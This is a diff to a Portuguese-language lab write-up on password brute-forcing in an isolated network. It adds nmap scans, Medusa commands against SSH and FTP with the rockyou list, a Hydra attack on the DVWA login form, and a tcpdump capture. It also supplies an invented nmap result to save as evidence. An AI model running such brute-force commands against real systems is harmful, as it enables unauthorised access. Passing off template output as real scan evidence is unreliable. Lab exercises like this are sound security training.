@@ -50,3 +50,47 @@ Máquinas foram iniciadas em rede isolada para evitar impacto externo.
 sudo apt update
 sudo apt install -y medusa hydra nmap tcpdump
 ls -lh /usr/share/wordlists/
+
+### 4.2. Scan de serviços
+```bash
+nmap -sV -p- 192.168.56.102 -oN nmap_full_scan.txt
+# ou scan focado:
+nmap -sV -p22,21,80,443 192.168.56.102 -oN nmap_services.txt
+
+### 4.3. Força bruta em SSH (Medusa)
+```bash
+medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f -O evidencias/medusa_ssh.txt
+
+### 4.4. Força bruta em FTP (Medusa)
+```bash
+medusa -h 192.168.56.102 -u ftp -P /usr/share/wordlists/rockyou.txt -M ftp -t 4 -f -O evidencias/medusa_ftp.txt
+
+### 4.5. Força bruta em formulário HTTP (DVWA) — exemplo com Hydra
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login" -V -o evidencias/hydra_http_dvwa.txt
+
+### 4.6. Captura de tráfego (pcap)
+```bash
+sudo tcpdump -i <interface> host 192.168.56.102 and host 192.168.56.101 -w evidencias/capture_lab.pcap
+# Pare com Ctrl+C quando terminar.
+
+---
+
+# Agora os arquivos `.txt` (templates / exemplos) — copie e salve em `evidencias/`
+
+## `nmap_full_scan.txt`
+```text
+# nmap 7.80 scan initiated Thu Oct  7 14:00:00 2025 as: nmap -sV -p- 192.168.56.102
+Nmap scan report for 192.168.56.102
+Host is up (0.00050s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.4
+22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.2.8
+443/tcp  open  ssl/http Apache httpd 2.2.8
+3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
+MAC Address: 08:00:27:xx:xx:xx (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Oct  7 14:00:15 2025 -- 1 IP address (1 host up) scanned in 15.00 seconds
